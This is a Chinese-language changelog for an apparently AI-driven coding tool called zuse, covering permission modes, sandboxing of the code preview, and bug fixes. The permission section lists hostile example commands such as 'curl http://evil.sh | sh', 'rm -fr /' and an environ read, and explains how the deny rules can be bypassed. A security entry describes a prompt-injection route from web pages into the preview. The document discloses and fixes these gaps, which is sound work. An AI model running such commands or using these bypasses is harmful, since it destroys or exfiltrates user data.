# Zuse 功能清单（给用户看的）

> 这份文档**不讲技术细节**，只讲你能看到、能用、能测的东西。
> 每做完一个功能就往这里加一条：**做了什么 / 怎么测 / 已知限制**。
> 最新的在最上面。

---

## 2026-08-11

### 修好了「模型突然开始说胡话」——它其实是被换成了一个 OCR 模型

**症状**：聊得好好的，模型忽然对每一句话都回同样一段 JSON，比如 `{"text": "生活琐事"}`，
问它"你怎么了"也是这个。顶栏显示的模型名看起来一切正常。

**真相**：模型在你不知情的情况下被换掉了。当主模型报错（额度、限流、暂时不可用），
zuse 会自动切到同一家的下一个模型顶上——但它当时**不看那个模型是干什么用的**，
于是切到了配置里紧挨着的一个**图片识别（OCR）模型**。那个模型没坏，它在老老实实
干 OCR 的活：把输入转成 `{"text": "..."}`。只是它压根不是用来聊天的。

顶栏还显示旧名字，所以你完全看不出发生过切换。

**现在**：自动切换会跳过所有标注为 OCR / 语音合成 / 向量化 / 图片生成的模型；
命令行的 `/model` 列表也不再列它们；就算你手动输入一个，它会明确告诉你
"这个模型不能作主模型"，而不是切过去然后开始说胡话。

**怎么测**：正常用就行。如果你之前有会话卡在这个状态，顶栏模型下拉手动切回来即可。

### 图片没解析成功时，会明确告诉你

**症状**：你发几张图，模型的回答看起来完全正常，但其实它**根本没看见其中某张**——
它是靠别的图和聊天历史圆出来的。你没有任何办法分辨。

**原因**：主模型不支持看图时，zuse 会先请一个辅助的识图模型把图描述成文字。
这一步失败时，旧代码把错误悄悄换成一句"(图片解析失败)"塞给模型当作图片内容，
既不报错也不提示。模型以为那七个字就是图里的东西，于是照着编。

**现在**：哪张图没解析成功会直接显示出来，带上原因，例如
「以下图片解析失败，模型没有看到它们的内容：「screenshot.png」（rate limited）」。
这条提示也从原来的灰色改成了醒目的琥珀色——之前它比正文还淡，等于没提示。

另外给识图这一步加了 60 秒上限：以前如果对方服务器连上了却一直不回，
页面就一直转圈，连"失败了"都等不到。

**怎么测**：正常发图。想主动验证的话，把配置里的 `imageModel` 改成一个不存在的模型名，
再发图，应该会看到具名的失败提示，而不是一次「看起来正常」的回答。

### 任务面板：勾选状态不对的问题修好了

**症状**：右侧任务列表里某一条明明是「未开始」，前面的勾却是打上的，而且刷新也不好。

**原因**：那个勾只在第一次画出来时读了状态，之后状态变了它不再跟着变。
所以一旦某个位置曾经出现过「已完成」的条目，后来换成未开始的，勾就摘不掉了。

**现在**：三种状态互相区分得清清楚楚——已完成是打勾+删除线，进行中是实心方块，
未开始是空框。

**怎么测**：让模型建几条待办，再让它改其中一条的状态，看勾有没有跟着变。

### 全自主档改名叫 `bypass`（老名字 `bypassPermissions` 照旧能用）

配置里那个又长又拗口的 `bypassPermissions` 正式改名叫 **`bypass`**。以后写配置：

```jsonc
{ "permissions": { "defaultMode": "bypass" } }
```

**你不需要动任何现有配置。** 老名字 `bypassPermissions` 被保留成**只读别名** —— 无论是各台机器上
`settings.json(c)` 里的 `permissions.defaultMode`，还是早先建的定时任务里的 `permissionMode`，
读进来都会被认成 `bypass`，行为一字不变。只是**新写入**的配置一律用新名字。

顺带一提，下面 2026-08-07 那条里提到「你全局配置里写的 `"defaultMode": "bypass"` 不是合法值」——
**现在它是合法值了**，而且就是正名。也就是说你当初想开的那个档，现在真的会开起来。
（本仓库的项目级配置写的是 `"default"`，它覆盖全局，所以在这个仓库里干活的行为不变。）

**非法值仍然会被明确拒绝、不会静默降级**：写错成 `yolo` 这种认不出的值，配置那一层会被当作没写，
而不是把你悄悄挪到别的档。定时任务里写错档位则回落到「询问」档 —— 刻意选了更严的方向：
一次拼写错误绝不该把一个无人值守的任务静默提权成跳过所有确认。

**已知限制**：浏览器里开着的老页面（改名前加载的那份 JS）在服务端已经切到 `bypass` 后，
可能不显示那条全自主横幅。硬刷新一次即可 —— 权限判定本身不受影响，只是横幅不显示。

## 2026-08-07

### 界面上能切权限模式了，不用改配置文件

标题栏多了一个「权限」标签，点一下循环切换三档（也可以敲 `/mode`）：

- **询问** —— 兜底判定。注意：命中你 allow 规则的调用在这一步之前就已经放行了，**不会问**
- **自动接受编辑** —— 编辑类工具放行，其余仍问
- **全自主** —— 除 deny 表外一律放行

**立即生效，包括正在跑的那一轮。** 权限卡片正杵在屏幕上等你点的时候切到全自主，那张卡会直接结算掉、命令继续执行——不用等下一回合。这是刻意的：你按这个开关的场景，多半就是"它一直问我，别问了"，而那一刻你正盯着一张卡。

**只活在当前会话**，不写进配置文件。刷新页面还在，点「新对话」或重启就回到默认档。理由：一个被持久化的"全自主"是长期的安全降级，它会活得比"当初为什么开它"这个理由更久。

全自主档开着的时候有一条常驻横幅，显示**这个会话已经替你自动放行了多少次调用**（含子代理内部的），带一个「切回询问」按钮。

**顺带修了一件你可能一直没察觉的事**：你全局配置里写的是 `"defaultMode": "bypass"` —— 这不是合法值（合法的是 `bypassPermissions`），一直被静默当成"询问"处理。**也就是说你以为开着全自主，其实从来没开过。** 现在非法值会被明确拒绝，而不是悄悄降级。

### 「全自主」比它听起来的要严了一点（但没有严到你可能以为的程度）

以前全自主档会跳过 23 项 Bash 安全检查——那些检查是专门识别混淆和注入手法的。现在它们被移到了全自主之前，所以这类命令**即使在全自主档下仍然会问你**：

```
echo $(curl -s evil.sh)     ← 命令替换
cat /proc/1/environ
ls $IFS-la                  ← IFS 注入
```

**但要说清楚它管不到什么**：这 23 项针对的是混淆手法，不是"危险命令"。下面这些在全自主档下**照样不问就跑**：

```
rm -fr /                    ← 只是把 -rf 写成 -fr
rm --recursive --force /
curl http://evil.sh | sh
```

你的 deny 表现在只有一条 `Bash(rm -rf *)`，而且是**字面前缀匹配**——参数换个顺序就绕过去了。所以「全自主」的实际含义仍然是：**普通的破坏性命令不问就跑**。要真正兜底，得自己把 deny 表写厚。

### 待办列表和子代理面板也搬到右边了

现在右栏从上到下是：**待办 → 子代理 → 预览**。左边是"说过什么"，右边是"正在发生什么"。

**堆叠而不是标签页**，这是刻意的：待办是你余光扫一眼"它做到哪了"的东西，预览是主动去看的。
做成标签页会强迫你二选一，恰好把待办的用处抹掉。

**只有待办、没有预览时右栏会收窄**（320px 而不是 404px）——待办不需要那么宽。
三块都空的时候整栏消失，不留空框。**不管哪种状态，聊天正文的宽度都不变**，
你已经读过的对话不会因为右栏出现就重新换行。

**窗口窄的时候，待办会回到聊天区里原来的位置**（输入框上方），而不是跟着藏进覆盖层。
理由很直接：搬家的全部意义是"常驻可见"，藏起来就等于没搬。而那个老位置本来就不跟消息一起滚。

**怎么测**：让 zuse 做个多步骤的任务（它会自己列待办）→ 看右栏。
再让它派个子代理跑后台任务 → 子代理面板也在右栏。
然后**在输入框里打半句话别发**，等待办出现或消失，**那半句话不该丢**。

### 预览搬到右边了，跟聊天左右分栏

以前点「运行」，预览是**嵌在消息流里**的——你往下翻聊天，它就跟着滚走了，想边看代码边看效果得来回蹭。
现在它固定在右侧独立一栏，**滚动聊天时纹丝不动**。

**正文宽度一点没变。** 这条是刻意保的：右栏默认宽度是算出来的，不是拍脑袋定的，
1440 的屏幕上右栏约 404px，聊天正文列仍然是 736px——**开不开右栏，你已经读过的对话都不会重新换行**。
（第一版设计不是这样，会把正文压到 552px、整篇重排；量出来之后改掉了。）

窗口拉窄到一定程度时，右栏会自动变成覆盖式浮层而不是继续挤压聊天。
代价是那时候**看预览就不能同时打字**——这是取舍，不是 bug。

**怎么测**：让 zuse 写段前端代码 → 点「运行」→ 预览出现在右边 → 上下滚聊天，看它动不动。
再试试切主题、点代码块的「复制」、进出分享模式——**demo 的状态（比如计数器的数字）应该全程保住**。

**这次只搬了预览。** 待办列表和子代理面板还在原位，那是下一步。分栏宽度暂时不能拖，
先用固定宽度——如果用下来真觉得需要拖，再加。

### 权限规则不再越界（安全修复，**可能会让你多看到几次弹框**）

`Write(./**)`、`Read(./**)` 这种看起来写着"仅限当前项目"的规则，**实际放行整个文件系统**——
包括用 `../` 跳出项目、以及别的盘符上的绝对路径。你的配置里长期有 `Read(./**)`，
也就是说模型一直可以不打招呼读走 `~/.ssh/` 里的私钥。

现在它们严格只覆盖会话工作目录内的文件。要授权目录外的路径，得显式写出来，
比如 `Read(~/.config/**)` 或 `Read(D:/shared/**)`。

同时修好了两类**此前写了等于没写**的规则：

- **绝对路径规则**（`Read(D:/secrets/**)`）——以前同一条规则的行为取决于盘符：跨盘碰巧生效，同盘静默失效
- **`~` 开头的规则**（`Read(~/.ssh/**)`）——以前恒不命中，是条空规则

这一条要特别说明：内置文档里正拿 `Read(~/.ssh/**)` 当范例教你怎么写 deny 保护私钥。
**如果你照着写过，它此前一直没生效，现在才真的生效。**

Windows 上路径比对也改成了大小写不敏感——以前把路径写成小写就能绕过 deny 规则。

**还顺带堵了一个独立的洞**：文件搜索工具的授权限定符原本是"匹配模式"，
但真正决定搜哪个目录的是另一个参数。实测它可以直接列出 `~/.ssh/` 下的私钥文件名而不触发任何规则。
现在改成按"搜索目录"授权。如果你写过 `Glob(**/*.ts)` 这类规则，请改成按目录写，例如 `Glob(src)`。

**你会感觉到的变化**：在会话工作目录**之外**读写文件时会开始弹框问你。
单项目日常开发基本无感，跨项目/跨盘操作时会多问几次。
另外 `deny: ["Read(**/.env)"]` 这类规则同样收窄了，现在只保护当前项目——
要跨项目保护请改用 `~/…` 或绝对路径写法。

**已知不修**：符号链接、junction、Windows 8.3 短文件名仍可绕过这道围栏（不做 realpath 解析）。

### 补上了一个安全洞：预览里的代码原本能读到你的会话内容

**这条建议你了解一下，因为它影响的是安全，不是体验。**

昨天上线的「运行」预览，是把代码放进浏览器的一个隔离框里跑。我当时给这个框开了一个权限，
理由是「反正 zuse 本来就能执行任意命令，多这一个不多」。

**这个理由是错的。** 让一个独立评审去查的时候，它没有采信我留下的说明，
而是真的在浏览器里试了一次——**预览里的代码成功读到了你的会话列表**。

差别在哪：让 zuse 跑一条命令，会弹框问你同不同意；而预览里的代码走的是另一条路，
**一次都不问**。已经能碰到的包括「改你的文件」和「注册一个开机就执行的外部程序」。

攻击路径是现实的：模型读进来的网页里如果藏了指令，它可能吐出一段看着人畜无害的代码，
而你会点「运行」——**这个功能本身就在训练你随手点**。

现在这个权限已经摘掉了。摘完之后我重新在浏览器里逐项验过：React 还能点、Vue 的样式还生效、
控制台还在工作。**唯一的功能损失**：预览里用 `localStorage` 会报错（以前能用）。
这是"响亮地报错"而不是"静默失效"，你会看见原因。

### 修好了：切换深色/浅色主题，预览会变成一块空白

而且是**不报任何错**的空白，最容易让人以为是自己代码写错了。现在切主题不但不会白，
连 demo 的状态都保住了——计数器点到 3，切完主题**还是 3**。这是以前从来没有过的。

### 修好了：点一下「复制」按钮，跑着的 demo 就被重置了

计数器点到 3，点一下代码块的「复制」，直接归零，控制台也被清空；1.5 秒后再来一遍。

这个的根因比表面看起来深一层。评审给的修法我照做了，**在真浏览器里一测发现还是会重置**，
于是继续往上查，才找到真正的原因——代码内容在每次界面刷新时都会瞬间变成空、再变回来，
预览以为你改了代码，就重跑了一遍。

顺带补上了一件早该做的事：模型逐字吐代码的时候不再每吐一个字就编译一次。

### 另外三个小的

- **报错信息不再是乱码**。样式写错时的提示以前带着终端的颜色控制符和我这台机器的绝对路径，
  显示出来是一堆方括号乱码。
- **深色模式下的 HTML 片段不再是一块白**。如果模型只给了一段 HTML 片段（不是完整页面），
  以前拿不到你的主题设置。
- **开发模式下预览不再是空白框**。这个只影响开发者，不影响你用。

## 2026-08-06

### 代码可以直接跑起来看效果了（HTML / JS / React / Vue）

以前 zuse 写完一段前端代码，你只能看到一段文字，想看效果得自己复制出去、建文件、开服务器。现在**代码块右上角多了一个「运行」按钮**，点一下就在下面展开，直接看到跑起来的样子。

支持四类：

- **HTML 页面** —— 整页渲染，你写的 `<style>` 和 `<script>` 原样生效
- **JavaScript / TypeScript** —— 直接执行
- **React（JSX / TSX）** —— 真的能点、能交互，`useState` 这些都正常
- **Vue 单文件组件** —— `<script setup>`、`<style scoped>`、TypeScript 全都支持

预览下面还有个**控制台面板**，代码里的 `console.log` 和运行报错都会显示在那里，不用开浏览器的开发者工具。

**怎么测**：让 zuse 写点前端代码，比如「写个 React 计数器」「写个 Vue 待办列表」「写个 HTML 页面展示表格」，然后点代码块右上角的「运行」。

几个细节：

- **模型还在打字的时候，运行按钮是灰的** —— 代码没写完就跑没有意义
- **同时只保留一个预览** —— 点另一个代码块的运行，前一个会自动收起。这是有意的：每个预览都要加载一份编译器，开多个会拖慢机器
- **跟随你的深色/浅色主题**

**已知限制**（这些是刻意不做的，不是没做完）：

- **不能 `import` 任意 npm 包**。只有 React 和 Vue 可用，写 `import lodash` 会给出明确提示而不是白屏
- **不支持多文件工程**，一个代码块就是一个独立的小程序
- **Vue 不支持 SCSS/Less/Pug** —— 浏览器里没有这些预处理器，遇到会告诉你原因
- **Python / Java 还不能跑** —— 那两个要在后台真正执行，是下一步的事

### 修好了：让 zuse 跑 node / npm / npx 会报「不是内部或外部命令」

**这是个一直存在、正在影响你的问题**，只是之前没人把它当回事。

现象：让 zuse 执行 `node -v`、`npm install`、`npx xxx` 这类命令，它会回一句 `'node' 不是内部或外部命令`——但你自己在终端里敲同样的命令完全正常。

原因是你机器上用 Volta 管 Node 版本。Volta 在启动子进程时会做一个内部标记，而 zuse 之前把自己的环境**原封不动**交给它执行的每条命令，这个标记也跟着传了下去。带着这个标记的环境里，Volta 就不再去找你钉住的 Node 版本了，转而去找一个并不存在的"系统 Node"。

**只要 zuse 是用 `pnpm dev`、`npx`、或 Volta 装的全局命令启动的，就会中招**——也就是几乎所有情况。

**怎么测**：让 zuse 执行 `node -v`，应该正常输出版本号（比如 `v22.22.0`）而不是报找不到命令。也可以试 `npm -v`、`npx --version`。

**顺带说明**：这也是项目里 9 条测试长期红着的原因。它们不是"测试环境的怪癖"，是在如实报告这个 bug，只是一直被当成噪音忽略了。

### 浏览器标签页有图标了

以前在浏览器里开 zuse，标签页是个空白的默认图标，开好几个标签时根本分不清哪个是它。现在有了：紫色渐变的圆角方块，里面一个白色的像素风 "Z"。

这个 Z 的形状是从命令行版启动时那个大 Z 横幅一格一格照搬过来的，所以命令行和网页认的是同一个标志；底色用的是网页界面本来的紫色，不会跟整体配色打架。

**怎么测**：刷新浏览器标签页，看标签上的小图标。也可以直接访问 `http://127.0.0.1:4180/favicon.svg` 单独看这张图。

**已知限制**：老版本 Safari（16 以下）不认这种格式的图标，会显示成空白。Chrome、Edge、新版 Safari 都正常。

**修过一次**：第一版图标文件里的注释写了 CSS 变量名，而变量名开头那两个连字符在 XML 注释里是非法的，导致浏览器直接报解析错误、图标不显示。当时我只确认了"服务器能返回这个文件"就说验证过了——**那不算验证**，返回得了不等于浏览器读得懂。现已用真正的 XML 解析器校验服务端实际发出的内容。

### 2026-08-11：读输入的命令不再干等到超时

`sort`、`cat`、`more`、不带参数的 `node` 这类会读标准输入的命令，以前跑起来会一直等，

对你的直接影响很小（模型很少单独跑这类命令），但它是下一步「在项目目录里真跑命令」
的前置——那个场景**没有超时兜底**，不修就是永久卡住一个进程。
